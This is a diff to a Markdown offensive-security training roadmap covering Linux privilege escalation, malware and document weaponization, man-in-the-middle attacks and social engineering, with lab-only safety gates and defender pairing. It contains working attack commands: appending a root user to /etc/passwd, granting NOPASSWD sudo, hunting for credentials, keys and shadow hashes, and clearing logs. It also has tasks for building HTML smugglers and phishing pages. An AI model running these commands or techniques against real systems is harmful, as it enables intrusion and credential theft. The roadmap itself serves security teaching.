+- [ ] **Writable /etc/passwd:** If `/etc/passwd` is world-writable, add a new root user with a known password hash (`openssl passwd -1 password` → `$1$...`): `echo 'hacker:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd`.
+
+- [ ] **Writable /etc/shadow:** Direct password change for root or any account.
+
+- [ ] **Writable /etc/sudoers or /etc/sudoers.d/:** Add `ALL=(ALL:ALL) NOPASSWD: ALL` for your user.
+
+- [ ] **NFS Root Squash Disabled:** If `/etc/exports` contains a share with `no_root_squash`, mount it from attacker machine as root, create a SUID binary, and execute on target.
+
+**Vector 6 — Kernel Exploits (Last Resort):**
+
+- [ ] **When to Use:** Kernel exploits are noisy, risky (system crash), and should be the last vector tried — after all misconfiguration-based vectors are exhausted.
+
+- [ ] **Identification:** `uname -a` → kernel version → check **linux-exploit-suggester-2** and **searchsploit** for matching CVEs. Verify exploit is tested for your exact distribution and version.
+
+- [ ] **Known Exploits:** Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), DirtyCred (CVE-2022-2588), OverlayFS (CVE-2023-0386), Looney Tunables (CVE-2023-4911). Understand each mechanism rather than running blind.
+
+- [ ] **Compilation on Target:** Many kernel exploits require compiling on the target or a matching system — check `gcc --version` and available headers (`/usr/include`).
+
+**Vector 7 — Environment & Configuration Leaks:**
+
+- [ ] **History Files:** `cat ~/.bash_history`, `cat ~/.zsh_history`, `cat ~/.mysql_history`, `cat ~/.python_history` — frequently contain passwords, commands run as root, or credentials passed as CLI arguments.
+
+- [ ] **Config Files & Credentials:** `find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name ".env" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null` — locate configuration files with embedded credentials.
+
+- [ ] **SSH Keys:** `find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null` — unprotected private keys can provide lateral movement or privilege escalation.
+
+- [ ] **Database Credentials:** Web application config files (`/var/www/html/config.php`, `wp-config.php`, `database.yml`, `.env`) frequently contain MySQL/PostgreSQL credentials that reuse the root password.
+
+- [ ] **Readable /etc/shadow:** `cat /etc/shadow` — if readable, extract hashes and crack offline with hashcat.
+
+**Vector 8 — Service & Process Exploitation:**
+
+- [ ] **Root-Running Services:** `ps aux | grep root` — identify services running as root that may have vulnerabilities or writable config files.
+
+- [ ] **Writable Service Binaries:** `find /etc/systemd/system/ -writable 2>/dev/null` — writable unit files allow modifying `ExecStart` to execute arbitrary commands as root on next service start/restart.
+
+- [ ] **Weak File Permissions on Critical Binaries:** `ls -la /usr/bin/<service>` — if a service binary is world-writable, replace it.
+
+**Linux Privesc Lab Targets (Recommended Practice):**
+
+| Platform    | Machine/Room            | Primary Vectors Covered              |
+| ----------- | ----------------------- | ------------------------------------ |
+| TryHackMe   | "Linux PrivEsc" room    | SUID, sudo, cron, capabilities, PATH |
+| HackTheBox  | Jarvis, Sunday, Shocker | SUID, sudo misconfiguration          |
+| HackTheBox  | Cronos                  | Cron job hijacking                   |
+| VulnHub     | Lin.Security            | Comprehensive multipath              |
+| Local Build | Custom misconfig VM     | Build your own with 8 vectors above  |
 
 **Container & K8s Breakout:**
 
@@ -755,6 +1023,7 @@
 ---
 
 <a id="stage-3-the-stronghold-persistence-lateral-movement"></a>
+
 ### **Stage 3: The Stronghold (Persistence & Lateral Movement)**
 
 > [!TIP]
@@ -801,6 +1070,7 @@
 ---
 
 <a id="stage-4-the-shadow-defense-evasion-anti-forensics"></a>
+
 ### **Stage 4: The Shadow (Defense Evasion & Anti-Forensics)**
 
 > [!TIP]
@@ -841,6 +1111,7 @@
 ---
 
 <a id="stage-5-data-exfiltration-impact"></a>
+
 ### **Stage 5: Data Exfiltration & Impact**
 
 > [!TIP]
@@ -869,6 +1140,7 @@
 ---
 
 <a id="stage-6-the-professional-governance-reporting"></a>
+
 ### **Stage 6: The Professional (Governance & Reporting)**
 
 > [!TIP]
@@ -903,6 +1175,7 @@
 - [ ] **Metrics & KPIs:** Highlight **MTTD (Mean Time to Detect), MTTC (Mean Time to Contain), detection gaps**.
 
 <a id="lab-progression-part-7-system-hacking-initial-compromise"></a>
+
 ### **Lab Progression (Part 7: System Hacking & Initial Compromise)**
 
 > [!TIP]
@@ -912,8 +1185,39 @@
 - [ ] **Credential Handling Lab:** Capture and crack lab-only hashes, then document storage, chain of custody, and cleanup. Use the Password Cracking Gate before attempting this.
 - [ ] **Post-Exploitation Timeline:** Build an operator timeline and defender timeline for one lab compromise.
 - [ ] **Detection Pairing:** For every exploit path, identify Windows Event Logs, Sysmon, auditd, network, or SIEM artifacts.
-> [!IMPORTANT]
-> **Move-On Gate:** Submit 3 full lab attack reports using the Part 39 structure.
+  > [!IMPORTANT]
+  > **Move-On Gate — Part 7: System Hacking & Initial Compromise**
+  >
+  > You are not ready to move to Phase 2B until you can demonstrate ALL of the following without referencing a walkthrough:
+  >
+  > **Initial Access**
+  >
+  > - [ ] Exploit at least 3 different initial access vectors (SQLi, buffer overflow, phishing payload, or file upload bypass) on lab targets and produce a working shell
+  > - [ ] Enumerate a target using only `nmap`, `gobuster`, and `linpeas`/`winpeas` without automated exploitation frameworks as a first pass
+  >
+  > **Windows Privilege Escalation**
+  >
+  > - [ ] Achieve SYSTEM from a low-privilege foothold using at least 2 different vectors (UAC bypass, service misconfiguration, token impersonation, or DLL hijacking)
+  > - [ ] Run `winPEAS` and manually interpret every orange/red finding without relying on auto-exploitation
+  >
+  > **Linux Privilege Escalation**
+  >
+  > - [ ] Achieve root from a low-privilege foothold using at least 3 different vectors from the 8-vector methodology above (SUID, sudo misconfiguration, cron job, capabilities, writable file, NFS, kernel, or config leak)
+  > - [ ] Complete at least 1 of: TryHackMe "Linux PrivEsc" room, HackTheBox Jarvis, or HackTheBox Cronos — with a written walkthrough
+  >
+  > **Persistence & Lateral Movement**
+  >
+  > - [ ] Demonstrate 2 Windows persistence mechanisms (registry RunKey, scheduled task, service installation) and identify their Event Log artifacts
+  > - [ ] Successfully move laterally using Pass-the-Hash or Pass-the-Ticket in a lab Active Directory environment
+  >
+  > **Defense Evasion**
+  >
+  > - [ ] Identify what EDR/AV telemetry each technique generates and document a detection gap for at least 1 technique
+  >
+  > **Reporting**
+  >
+  > - [ ] Submit 3 full lab attack reports using the Part 39 structure (scope → recon → exploitation → post-exploitation → impact → remediation)
+  > - [ ] Each report must have a defender timeline paired with the operator timeline
 
 <a id="toc-part-8-malware--weaponization"></a>
 
@@ -926,119 +1230,146 @@
 ---
 
 <a id="part-8-malware-weaponization"></a>
+
 ## Part 8: Malware & Weaponization
 
 > **Safety Gate:** Malware work is restricted to isolated local labs with snapshots, host-only networking, no shared clipboard, no mounted host folders, and no third-party targets. Before running any sample or payload, define expected behavior, logging sources, rollback steps, and containment checks.
 
+> [!NOTE]
+> **Scope of This Part — Read Carefully:** This Part teaches malware as a **survey course**, not an implementation course. At this stage you have not yet studied how malware works at the binary/code level — that knowledge comes in **Part 28 (Reverse Engineering & Malware Analysis, Phase 7)**. Without that foundation, any malware you write will be a copy-paste artifact you cannot debug, fix, or adapt when it fails (and it will fail).
+>
+> **What IS covered here (practitioner-level):**
+> - Malware taxonomy and attack lifecycle (categories, architecture decisions, C2 design thinking)
+> - Tool-based weaponization: `msfvenom`, Metasploit payload generation, framework-managed C2 (Sliver, Mythic)
+> - How AV/EDR detects malware conceptually (signature, heuristic, behavioral scanning)
+> - Document and cloud delivery vectors — the initial access tradecraft that red teamers use operationally
+>
+> **What Stages 2–5 teach (exposure-level, not implementation-level):**
+> Stages 2, 3, 4, and 5 describe techniques — shellcode injection, EDR bypass, anti-forensics — at the level of *what they are and how they work conceptually*. They are not implementation labs. Each of those stages carries an explicit `[!WARNING]` marker. When you see that marker: understand the concept, understand what defenders see, move on. Do **not** attempt custom code implementation until you have completed **Part 28 (RE & Malware Analysis)** and **Part 42 (Offensive Development, Phase 7)**.
+>
+> **Why this sequencing matters:** Students who attempt custom malware engineering before Part 28 produce tools they cannot debug, cannot evade EDR reliably, and cannot modify under time pressure. The correct sequence is: *understand the attack here (Part 8) → understand binaries and malware internals (Part 28) → build your own tooling (Part 42).*
+
 <a id="stage-1-the-design-logic-architecture"></a>
+
 ### **Stage 1: The Design & Logic (Architecture)**
 
 > [!TIP]
-> **Goal:** Design the malware's purpose using core security principles.
+> **Goal:** Understand how malware is architected at a design level — the decisions an attacker makes before writing a single line of code.
 
-- [ ] **Target the CIA Triad:** Define if your payload destroys **Integrity** (Wipers/Data modification) or denies **Availability** (Ransomware/DDoS).
+- [ ] **Target the CIA Triad:** Define the malware's objective — does it attack **Confidentiality** (RAT, spyware, credential harvester), **Integrity** (wiper, data corruption), or **Availability** (ransomware, DDoS bot)? The objective drives every architectural decision.
 
-- [ ] **Weaponize Cryptography:** Implement **Public vs Private Keys** (Asymmetric Encryption) to lock files securely, ensuring only the attacker holds the decryption key.
+- [ ] **Malware Taxonomy:** Understand the full taxonomy — **dropper, loader, stager, RAT, rootkit, worm, ransomware, wiper, infostealer, spyware, adware, botnet agent** — and how each category relates to the attack lifecycle phase it serves.
 
-- [ ] **Cryptographic Attacks:** Understand **padding oracle attacks, timing attacks, weak random number generation** to break encryption implementations.
+- [ ] **C2 Protocol Selection:** Understand the trade-offs between **HTTP/S beaconing, DNS tunneling, ICMP covert channels, and legitimate SaaS API abuse** — not to implement them at this stage, but to understand why attackers choose one over another based on network visibility risk. Implementation comes in Part 42.
 
-- [ ] **Key Management Flaws:** Exploit **hardcoded keys, weak key derivation (KDF), insecure key storage** in applications.
+- [ ] **Persistence Architecture:** Survey the persistence mechanisms available — **registry run keys, scheduled tasks, WMI subscriptions, DLL hijacking, boot sector** — understand their detection footprint differences conceptually. Implementation and lab practice comes in Part 7 (system hacking) and Part 42.
 
-- [ ] **C2 Protocol Design:** Choose **Secure vs Insecure Protocols** for Command & Control. Will you hide inside **HTTPS** traffic or use **DNS** tunneling to evade **Firewall & Next-Gen Firewall** inspection?
+- [ ] **Kill Chain Mapping:** Use the **Cyber Kill Chain** or **MITRE ATT&CK** to map a hypothetical malware campaign from **Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives**. This mapping exercise trains your mind to think like an attacker planning a campaign, not just using a tool.
 
-- [ ] **Risk Assessment:** Use the **Diamond Model** or **Cyber Kill Chain** to map out how your malware will move from **Reconnaissance** to **Actions on Objectives**.
+- [ ] **Diamond Model:** Apply the **Diamond Model** to a real APT's malware — adversary, capability, infrastructure, victim — to understand why the same malware capability looks different depending on the targeted victim sector.
 
 ---
 
 <a id="stage-2-the-payload-mechanism-weaponization"></a>
-### **Stage 2: The Payload & Mechanism (Weaponization)**
+
+### **Stage 2: The Payload & Mechanism — Exposure Survey**
+
+> [!WARNING]
+> **Exposure-Only Stage:** This stage describes weaponization techniques at a conceptual level. Do not attempt to implement custom payloads, shellcode injection, or custom C2 until you have completed **Part 28 (Reverse Engineering & Malware Analysis, Phase 7)** and **Part 42 (Offensive Development, Phase 7)**. Your goal here is to understand *what* these techniques do and *why* defenders flag them — not to build them.
 
 > [!TIP]
-> **Goal:** Execute code on the target system.
+> **Goal:** Understand how payloads execute and what defenders detect at each stage.
 
-- [ ] **Memory Exploitation:** Leverage **Buffer Overflow** or **Memory Leak** vulnerabilities to inject shellcode into legitimate processes, bypassing file scanning.
+- [ ] **Memory-Based Execution:** Understand that attackers inject code into running processes (shellcode injection, process hollowing, DLL injection) to avoid writing to disk and evade file-scanning AV. *Conceptual understanding only — implementation in Part 42.*
 
-- [ ] **Delivery Vectors:** Utilize **Social Engineering** (Phishing/Whaling) or **Drive-by Attacks** to get the initial execution on the endpoint.
+- [ ] **Delivery Vectors:** Understand **phishing, drive-by download, watering hole, and supply chain injection** as the four primary delivery mechanisms; know what each one requires from the attacker and what it looks like to defenders. *Practical delivery lab in Stage 6 (document weaponization) below.*
 
-- [ ] **Payload Staging:** Use **modern modular frameworks** (Sliver, Havoc, Mythic, Brute Ratel C4) and **Metasploit/Cobalt Strike** with signature-hardened profiles.
+- [ ] **Staged Payload Architecture:** Understand the difference between **stageless** (one-shot complete payload) and **staged** (stager fetches the full payload at runtime) delivery — know why staged reduces initial payload size but requires an active C2 listener. Use `msfvenom` to generate both and compare their byte sizes and detection rates against VirusTotal (educational only — never upload customer/lab-specific payloads).
 
-- [ ] **Cloud-Native C2:** Hide beacons inside **trusted APIs** (e.g., **Microsoft Graph/SharePoint, Slack/Teams webhooks**) to blend with enterprise traffic beyond HTTP/DNS.
-
-- [ ] **Living off the Land:** Use **LOLBAS**, **GTFOBins**, or **WADCOMS** to execute malicious logic using trusted system tools. _(See Part 7, Phase 2 for canonical LOLBAS/GTFOBins coverage.)_
+- [ ] **Framework-Managed C2:** Deploy **Sliver** or **Mythic** in your lab, generate an implant, and establish a callback — understand listener configuration, sleep/jitter tuning, and how traffic patterns affect detection. This is the operational-tool-based weaponization that is in scope at this stage.
 
 ---
 
 <a id="stage-3-evasion-defense-bypassing-invisibility"></a>
-### **Stage 3: Evasion & Defense Bypassing (Invisibility)**
+
+### **Stage 3: Evasion & Defense Bypassing — Exposure Survey**
 
 > [!WARNING]
-> **Prerequisite Context Required:** This stage teaches AMSI bypass, EDR hook removal, ETW manipulation, and memory-based evasion. These techniques only make sense if you understand what AMSI, EDR, and ETW actually ARE — how they collect telemetry, what they detect, and what a behavioral detection engine sees at runtime. That knowledge is in **Phase 3 (Part 13A: Stages 3–5)** — EDR/XDR fundamentals, script block logging, behavioral detection, and evasion counter-measures from the defender's perspective. If you haven't completed Phase 3 yet, read those stages before attempting the evasion techniques below. Evasion without understanding the detection model is guesswork.
+> **Exposure-Only Stage:** This stage teaches *how* AMSI bypass, EDR hook removal, and memory-based evasion work at a conceptual level. Do not attempt to implement these at this stage. Custom evasion requires understanding the Windows internals that these techniques exploit — that knowledge is in **Part 28 (Reverse Engineering & Malware Analysis)**. Practical evasion implementation is in **Part 42 (Offensive Development, Phase 7)**.
 
 > [!TIP]
-> **Goal:** Blind the defensive stack.
+> **Goal:** Understand how the defensive stack detects malware and what attackers do to evade each layer.
 
-- [ ] **Defeat Static Analysis:** Apply **Obfuscation** (packing, encoding) to change the file hash and bypass traditional **Antivirus** signatures.
+> **Prerequisite Context:** This stage references AMSI, EDR, and ETW. Those systems are covered from the defender's perspective in **Phase 3 (Part 13A: Stages 3–5)**. If you have not completed Phase 3 yet, read those stages before studying evasion — evasion without understanding the detection model is guesswork.
 
+- [ ] **Static Analysis Evasion:** Understand that AV signature detection works by matching known byte patterns — attackers evade it by changing the binary (packing, encoding, obfuscation). Know *that* this works conceptually; implementing a custom packer requires PE format knowledge from Part 28.
 
-- [ ] **Sandbox Detection:** Code the malware to detect **Sandboxing** environments (e.g., checking for specific drivers, lack of mouse movement) and go dormant to generate a **False Negative**.
+- [ ] **Sandbox Detection:** Understand that sandboxes run samples in controlled VMs — attackers detect this by checking for VM artifacts (driver names, low CPU count, no mouse movement), then go dormant. Know the technique; study the implementation in Part 28.
 
-- [ ] **EDR/DLP Bypass:** Unhook API calls to hide from **EDR** (Endpoint Detection Response) and **DLP** monitors. Operate in memory (Fileless) to avoid leaving disk artifacts.
+- [ ] **EDR Userland Hooking Bypass:** Understand that EDR products hook Windows API functions at userland to intercept suspicious calls — attackers bypass this by calling syscalls directly or by unhooking. *Conceptual understanding only — syscall implementation in Part 42.*
 
-- [ ] **Traffic Masking:** Encrypt C2 traffic to look like normal web browsing, defeating **NIDS/NIPS** (Network Intrusion Prevention Systems).
-
-- [ ] **In-Memory Evasion:** Apply **sleep obfuscation, call stack spoofing, indirect syscalls** to evade **memory scanning and EDR heuristics** during beacon idle time.
+- [ ] **Memory-Based Evasion Concepts:** Understand *what* sleep obfuscation, call stack spoofing, and indirect syscalls do — each is a technique that makes a beacon harder to detect during memory scanning. Implementation and lab practice in Part 42.
 
 ---
 
 <a id="stage-4-persistence-escalation-entrenchment"></a>
-### **Stage 4: Persistence & Escalation (Entrenchment)**
+
+### **Stage 4: Persistence & Escalation — Exposure Survey**
+
+> [!WARNING]
+> **Exposure-Only Stage:** Persistence mechanisms and privilege escalation are taught as canonical practitioner skills in **Part 7 (System Hacking, Phase 2)** already. This stage reviews them in the context of malware architecture — what a long-running implant uses to survive reboots and credential rotations. Rootkit-level persistence (BOOTKIT, UEFI implants, kernel drivers) requires kernel internals knowledge from Part 28. Do not attempt rootkit implementation at this stage.
 
 > [!TIP]
-> **Goal:** Survive reboots and gain total control.
+> **Goal:** Understand what persistence mechanisms a malware implant uses and why each has a different detection footprint.
 
-- [ ] **Privilege Escalation:** Exploit **Operating System Hardening** gaps or **Kernel** vulnerabilities (Zero Day) to escalate from User to **SYSTEM/Root**. _(See Part 7, Phase 2 for canonical privilege escalation methodology.)_
+- [ ] **Userland Persistence Review:** Map the common mechanisms — **registry run keys, scheduled tasks, WMI subscriptions, DLL search order hijacking, Startup folder, COM object hijacking** — to their Windows Event Log artifacts (which Event IDs indicate each mechanism was set). This is the defender-aware review; you practiced them in Part 7.
 
-- [ ] **Persistence Mechanisms:** Hide payload execution in **Scheduled Tasks**, **Registry Keys**, or **WMI** subscriptions to survive **Patching** and reboots.
+- [ ] **Privileged Persistence Concepts:** Understand that kernel-level and UEFI-level persistence (bootkits, driver implants) exist and require privileged access plus deep OS internals knowledge — covered in Part 28. Recognizing their artifacts is the skill to acquire here.
 
-- [ ] **Lateral Movement:** Use **Pass the Hash** or compromised **MFA & 2FA** tokens to pivot to other systems within the **Perimeter**. _(See Part 7, Phase 3 for canonical credential harvesting and lateral movement techniques.)_
-
-- [ ] **Defense Disabling:** Actively terminate **Antimalware** or **Host Based Firewall** processes if privileges allow.
+- [ ] **Defense Disabling (Conceptual):** Understand that advanced malware terminates AV/EDR processes or disables tamper protection when running as SYSTEM — recognizing this behavior in logs is the defender-relevant skill; the implementation is in Part 42.
 
 ---
 
 <a id="stage-5-counter-forensics-professionalism-the-cleanup"></a>
-### **Stage 5: Counter-Forensics & Professionalism (The Cleanup)**
+
+### **Stage 5: Counter-Forensics & Cleanup — Exposure Survey**
+
+> [!WARNING]
+> **Exposure-Only Stage:** Anti-forensics (log manipulation, timestamp modification, artifact scrubbing) are covered conceptually here. Implementing effective anti-forensics requires understanding *what* forensic artifacts exist — that knowledge is in **Part 27 (Digital Forensics, Phase 7)**. The skill to develop here is recognizing what evidence an attacker would try to destroy, so you can look for its *absence* during an investigation. Operationally, within a legitimate red team engagement, artifact cleanup must stay within Rules of Engagement and must never destroy evidence on production systems.
 
 > [!TIP]
-> **Goal:** Hide the tracks and adhere to engagement rules.
+> **Goal:** Understand what artifacts malware and operators leave behind, and what attackers do to reduce their forensic footprint.
 
-- [ ] **Anti-Forensics:** Use secure deletion to scrub **RAM artifacts** and **Packet Captures** to frustrate the **Basics of Forensics** investigation.
+- [ ] **Windows Artifact Landscape:** Know the key artifacts that survive after an attack — **Windows Event Logs, Prefetch files, Shimcache, Amcache, LNK files, MFT records, browser history, $MFT journal, registry hives** — and understand which artifacts survives a reboot, a log clear, or a disk wipe.
 
-- [ ] **Log Manipulation:** Alter or clear **Event Logs** and **Syslogs** to blind **SIEM** and **SOAR** systems from correlating the attack.
+- [ ] **Log Manipulation Awareness:** Understand that attackers clear Event Logs using `wevtutil cl System` and that this clearing *itself* generates Event ID 1102 (Security log cleared) — defenders look for the clearing event, not just empty logs. Also understand that SIEMs receive log forwarding — clearing local logs after a SIEM has already ingested them accomplishes nothing.
 
-- [ ] **Reverse Engineering Resistance:** Strip binary symbols and use anti-debugging techniques to make **Basics of Reverse Engineering** difficult for the Blue Team.
+- [ ] **Anti-Forensics Counter-Detection:** Know the defender techniques that defeat anti-forensics: **Write-Protect + Memory Forensics (Volatility)**, **SIEM log forwarding**, **EDR telemetry that bypasses local log clearing**, **backup snapshot retention**, and **network forensic reconstruction from PCAP**.
 
-- [ ] **Rules of Engagement:** (For Red Teams) Ensure the malware's scope aligns with the **Penetration Testing Rules of Engagement**—do not destroy production data unless authorized.
+- [ ] **ROE Compliance:** In a red team engagement, anti-forensics and log cleanup are controlled by Rules of Engagement — know exactly what your RoE permits before touching any log or artifact, and never destroy data on production systems regardless of privilege level.
 
 ---
 
 <a id="stage-6-document-cloud-weaponization"></a>
+
 ### **Stage 6: Document & Cloud Weaponization**
 
 > [!TIP]
-> **Goal:** Weaponize documents, email clients, and cloud services for initial access, persistence, and exfiltration. This content was previously misplaced in Part 1 (Fundamentals) — it requires knowledge from Parts 4–7 and Part 10 (Social Engineering) first.
+> **Goal:** Weaponize documents, email clients, and cloud services for initial access, persistence, and exfiltration. This is the **operational implementation stage** for Part 8 — the techniques here are in-scope for lab practice because they use documented attack patterns that do not require binary internals knowledge.
 
-> **Prerequisite:** Complete Part 7 (System Hacking), Part 9 (Sniffing & Spoofing), and Part 10 (Social Engineering) before this phase.
+> **Prerequisite:** Complete Part 7 (System Hacking), Part 9 (Sniffing & Spoofing), and Part 10 (Social Engineering) before this stage.
 
 **Office & Document Exploits:**
 
-- [ ] **VBA & XLM 4.0 Macros:** Build payloads, sign macros, and abuse **template injection (remote DOTM)**.
+- [ ] **VBA & XLM 4.0 Macros (Legacy — Declining):** Understand VBA macro payload construction and template injection (`remote DOTM`) — note that **Microsoft's February 2022 change blocks VBA macros from internet-sourced Office files by default** across Office 365 and 2019/2021. Macro-based delivery is now uncommon in phishing campaigns without specific user interaction (Enable Content prompt). Know the technique; prioritize modern alternatives below.
 
-- [ ] **DDE & Template Abuse:** Trigger code via **DDEAUTO**, external templates, and **Follina-style** URL template fetches.
+- [ ] **HTML Smuggling (Current Primary Vector):** Build HTML files that use the **`Blob` API and `createObjectURL`** to reconstruct a payload inside the browser, bypassing email gateway and web proxy file-type scanning. HTML smuggling now accounts for a significant proportion of red team initial access because attachments are not downloaded — they are assembled client-side. Practice building a minimal smuggler that delivers an EXE or ZIP without triggering gateway inspection.
 
-- [ ] **OneNote/PDF/Embedded Files:** Weaponize **OneNote pages, PDF JS**, and embedded **LNK/ISO/IMG** loaders; understand **MOTW** bypasses.
+- [ ] **OneNote/PDF/Embedded Files (Current Vector):** Weaponize **OneNote pages** (`.one` files with embedded scripts triggered by click), **PDF JavaScript** for opener execution, and **ISO/IMG container files** that bypass MOTW (Mark of the Web) on older Windows builds. Understand the **MOTW bypass path** (ISO → LNK → Script) and why Microsoft's October 2022 patches partially closed it.
 
-- [ ] **Protected View/ATP Evasion:** Study **mark-of-the-web**, **protected view**, and common sandbox evasion tricks.
+- [ ] **DDE & Template Abuse:** Trigger code via **DDEAUTO**, external DOTM template injection, and **Follina-style** (`CVE-2022-30190`) URL template fetch — understand the patch status of each and what still fires in unpatched environments.
+
+- [ ] **Browser-in-the-Browser (BitB) Attacks:** Build a **fake browser pop-up window** inside a legitimate page that mimics an SSO login dialog — bypasses awareness training because the URL displayed looks authentic. No code execution required; credentials are harvested directly.
 
 **Email Client Abuse:**
 
@@ -1072,13 +1403,26 @@
 
 - [ ] **Artifact Hygiene:** Track **recent documents, registry keys, LNK files**, and clear only when within ROE.
 
----
+### **Lab Progression (Part 8: Malware & Weaponization)**
+
+| Level | Task | Deliverable |
+|-------|------|-------------|
+| 1 | Generate 5 payload types with `msfvenom` (staged + stageless, EXE/DLL/PS1/ELF) and compare detection rates | VirusTotal screenshots + payload comparison report |
+| 2 | Deploy Sliver or Mythic in your lab, generate an implant, establish callback, and configure sleep/jitter | C2 lab setup guide + beacon screenshot |
+| 3 | Build an HTML smuggler that delivers a test payload (EICAR) through a simulated email gateway | HTML smuggler code + gateway bypass evidence |
+| 4 | Weaponize a OneNote file with an embedded script that calls back to your Sliver listener | Weaponized `.one` file + callback screenshot |
+| 5 | Map your lab campaign to MITRE ATT&CK — from delivery through C2 establishment | ATT&CK navigator layer JSON + technique annotations |
+
+> [!IMPORTANT]
+> **Move-On Gate (Part 8):** You can explain the malware taxonomy and choose the correct category for a given attack objective; generate payloads using `msfvenom` and a C2 framework; understand conceptually how Stages 2–5 techniques work and what defenders detect; deliver a weaponized document in a lab environment; and map a simulated campaign to MITRE ATT&CK. You are not expected to implement custom implants, PE packers, or EDR bypass code at this stage — that comes after Part 28 and in Part 42.
 
 <a id="toc-part-9-sniffing--spoofing"></a>
 <a id="part-9-sniffing-spoofing"></a>
+
 ## Part 9: Sniffing & Spoofing
 
 <a id="stage-1-the-environment-fundamentals-the-setup"></a>
+
 ### **Stage 1: The Environment & Fundamentals (The Setup)**
 
 > [!TIP]
@@ -1097,6 +1441,7 @@
 ---
 
 <a id="stage-2-sniffing-passive-reconnaissance-the-ear"></a>
+
 ### **Stage 2: Sniffing & Passive Reconnaissance (The Ear)**
 
 > [!TIP]
@@ -1113,6 +1458,7 @@
 ---
 
 <a id="stage-3-spoofing-active-deception-the-lie"></a>
+
 ### **Stage 3: Spoofing & Active Deception (The Lie)**
 
 > [!TIP]
@@ -1133,6 +1479,7 @@
 ---
 
 <a id="stage-4-man-in-the-middle-exploitation-the-kill"></a>
+
 ### **Stage 4: Man-in-the-Middle & Exploitation (The Kill)**
 
 > [!TIP]
@@ -1153,7 +1500,9 @@
 ---
 
 <a id="stage-5-defenses-mitigation-the-shield"></a>
+
 ### **Stage 5: Defenses & Mitigation (The Shield)**
+
 - [ ] **Encryption & VPN:** Force all traffic through **TLS/HTTPS, IPSec VPN, or VPN tunneling**; renders sniffed payloads unreadable; watch for **HSTS, certificate pinning** as anti-bypass measures.
 
 - [ ] **Switch-Level Protection:** **Dynamic ARP Inspection (DAI)**, **DHCP Snooping**, **port security** reject malformed ARP/DHCP; **802.1X authentication** prevents rogue device connection.
@@ -1165,15 +1514,16 @@
 - [ ] **User Awareness:** Train users to verify **SSL certificates**, recognize **phishing login pages**, and use **password managers** to avoid clipboard paste attacks.
 
 <a id="lab-progression-part-9-sniffing-spoofing"></a>
+
 ### **Lab Progression (Part 9: Sniffing & Spoofing)**
 
-| Level | Task | Deliverable |
-|-------|------|-------------|
-| 1 | Capture traffic with Wireshark in a home lab (HTTP, FTP, DNS) | Annotated pcap with credential extraction |
-| 2 | Perform ARP spoofing + MITM with Bettercap in lab | Screenshot of intercepted traffic |
-| 3 | Execute DNS spoofing to redirect lab traffic to phishing page | DNS spoof lab report |
-| 4 | Perform SSL stripping against a lab web server without HSTS | Before/after traffic comparison |
-| 5 | Full MITM chain: ARP spoof → DNS redirect → credential capture | End-to-end MITM lab report |
+| Level | Task                                                           | Deliverable                               |
+| ----- | -------------------------------------------------------------- | ----------------------------------------- |
+| 1     | Capture traffic with Wireshark in a home lab (HTTP, FTP, DNS)  | Annotated pcap with credential extraction |
+| 2     | Perform ARP spoofing + MITM with Bettercap in lab              | Screenshot of intercepted traffic         |
+| 3     | Execute DNS spoofing to redirect lab traffic to phishing page  | DNS spoof lab report                      |
+| 4     | Perform SSL stripping against a lab web server without HSTS    | Before/after traffic comparison           |
+| 5     | Full MITM chain: ARP spoof → DNS redirect → credential capture | End-to-end MITM lab report                |
 
 > [!IMPORTANT]
 > **Move-On Gate:** You can perform a complete MITM attack chain in a lab, capture credentials from unencrypted and downgraded traffic, and explain exactly which defenses (DAI, HSTS, certificate pinning) would have prevented each technique.
@@ -1181,12 +1531,19 @@
 ---
 
 <a id="toc-part-10-social-engineering"></a>
-<a id="part-10-social-engineering"></a>
+<a id="part-16-adversary-emulation-purple-teaming"></a>
+
+## Part 16: Adversary Emulation & Purple Teaming _(Phase 6 Capstone)_
+
+> [!NOTE]
+> **Navigational Note — Why Part 16 Is Here:** Part 16 is the **Phase 6 Capstone** — it synthesizes all content from Parts 23–26 (Active Directory, Cloud, Containers, OT) into a unified adversary emulation exercise. It is numbered 16 because it was originally placed sequentially after Phase 3's Part 15 (OSINT & Threat Intelligence) in the roadmap's initial design. It belongs contextually in Phase 6, not Phase 3. When you see cross-references to "Part 16" elsewhere in the roadmap, they refer to this section in Phase 6.
+
 ## Part 10: Social Engineering
 
 > **Safety Gate:** Social engineering practice must use consented simulations only. Do not target real people, employers, classmates, public organizations, or family accounts. Unauthorized phishing and impersonation are not "practice"; they are operational and legal exposure.
 
 <a id="stage-0-the-psychology-of-social-engineering"></a>
+
 ### **Stage 0: The Psychology of Social Engineering (The Foundation)**
 
 > [!IMPORTANT]
@@ -1208,7 +1565,7 @@ Robert Cialdini's research on influence identified six universal principles that
 - [ ] **3. Social Proof:** People look at what others are doing to determine correct behavior, especially in uncertain situations. Attackers fabricate social proof: "Everyone on your team has already verified their account" or "The CISO approved this procedure." Example: Mass-phishing emails claiming widespread adoption of a fake security update.
   - _Defensive awareness:_ Verify claims of "everyone is doing it" through independent channels — not through links or numbers provided by the requester.
 
-- [ ] **4. Authority:** People comply with perceived authority figures — especially in professional environments. Attackers impersonate executives (CEO fraud/BEC), IT helpdesk, auditors, law enforcement, or regulators. Example: "This is John from IT Security. We detected suspicious activity on your account. I need your current password to verify." 
+- [ ] **4. Authority:** People comply with perceived authority figures — especially in professional environments. Attackers impersonate executives (CEO fraud/BEC), IT helpdesk, auditors, law enforcement, or regulators. Example: "This is John from IT Security. We detected suspicious activity on your account. I need your current password to verify."
   - _Defensive awareness:_ Real authority figures with legitimate needs never require your password. Verify identity through a known, independent channel before complying.
 
 - [ ] **5. Liking:** People are more likely to comply with requests from people they like or who are similar to them. Attackers build rapport, mirror body language, reference shared interests, claim mutual connections, use flattery. Example: LinkedIn profile mining to find shared connections and mention them in a phishing email to build perceived familiarity.
@@ -1263,13 +1620,13 @@ Robert Cialdini's research on influence identified six universal principles that
 ---
 
 <a id="stage-1-intelligence-reconnaissance-the-setup"></a>
+
 ### **Stage 1: Intelligence & Reconnaissance (The Setup)**
 
 > [!TIP]
 > **Goal:** Know the target better than they know themselves.
 
